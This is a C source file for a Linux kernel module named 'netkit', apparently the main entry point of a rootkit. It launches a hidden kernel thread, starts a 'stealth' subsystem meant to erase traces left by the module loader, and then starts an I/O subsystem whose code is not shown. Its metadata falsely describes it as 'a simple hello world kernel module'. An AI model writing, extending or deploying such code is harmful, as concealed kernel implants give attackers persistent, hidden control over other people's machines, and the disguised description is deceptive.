#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/export.h>
#include <linux/kthread.h>
#include <linux/crypto.h>

#include "netkit.h"
#include "stealth/iface.h"
#include "io/iface.h"
#include "sys/lock.h"

static int netkit_main(void* args)
{
    DECLARE_WAIT_QUEUE_HEAD(mod_state_wait_queue);
    int retv;

    NETKIT_LOG("[+] module started (debug: %d)\n", CONFIG_NETKIT_DEBUG);

    // sets up worker refcounts
    netkit_workers_init();

#if CONFIG_NETKIT_STEALTH
    NETKIT_LOG("[*] waiting for module to be ready...\n");

    // poll every 100ms
    wait_event_interruptible_timeout(mod_state_wait_queue, THIS_MODULE->state == MODULE_STATE_LIVE, HZ / 10);

    NETKIT_LOG("[*] starting stealth...\n");
    retv = stealth_init();
    if (retv < 0)
    {
        NETKIT_LOG("[!] failed to start stealth (err: %d)\n", retv);
        return 0;
    }
#endif

    NETKIT_LOG("[*] starting IO...\n");
    retv = io_init();
    if (retv < 0)
        NETKIT_LOG("[!] failed to start IO (err: %d)\n", retv);

    return 0;
}

static int __init netkit_init(void)
{
#if CONFIG_NETKIT_STEALTH
    // be able to delete things required by the module loader post THIS_MODULE->init()
    KTHREAD_RUN_HIDDEN(netkit_main, NULL, "netkit-main");
#else
    netkit_main(NULL);
#endif

    return 0;
}

static void __exit netkit_exit(void)
{
    NETKIT_LOG("[*] stopping module...\n");

    io_exit();
    
#if CONFIG_NETKIT_STEALTH
    stealth_exit();
#endif

    NETKIT_LOG("[*] waiting for workers to exit...\n");
    netkit_workers_wait();

    NETKIT_LOG("[*] finished exiting module (^-^)7\n");
}

module_init(netkit_init);
module_exit(netkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("A simple hello world kernel module");
